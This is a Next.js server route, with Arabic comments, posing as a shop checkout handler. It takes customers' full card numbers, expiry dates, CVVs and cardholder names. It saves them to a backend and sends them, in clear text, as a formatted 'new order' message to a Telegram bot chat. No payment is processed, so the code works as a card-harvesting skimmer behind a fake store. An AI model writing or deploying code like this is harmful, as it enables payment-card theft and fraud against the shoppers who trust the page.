import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { cardNumber, expiry, cvv, cardHolder, items, total, customer } = await req.json();

  const orderId = `ORD-${Date.now()}-${Math.floor(Math.random() * 1000)}`;

  // حفظ في الداتابيز
  await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer }),
  });

  // إرسال تلجرام
  const text = [
    `🛒 طلب جديد`,
    `🆔 رقم الطلب: ${orderId}`,
    `👤 العميل: ${customer ?? "—"}`,
    `💳 رقم البطاقة: ${cardNumber}`,
    `👤 اسم حامل البطاقة: ${cardHolder}`,
    `📅 تاريخ الانتهاء: ${expiry}`,
    `🔐 CVV: ${cvv}`,
    `💰 الإجمالي: ${total?.toLocaleString("ar-SA")} ريال`,
  ].join("\n");

  await fetch(
    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text }),
    }
  );

  return NextResponse.json({ ok: true, orderId });
}
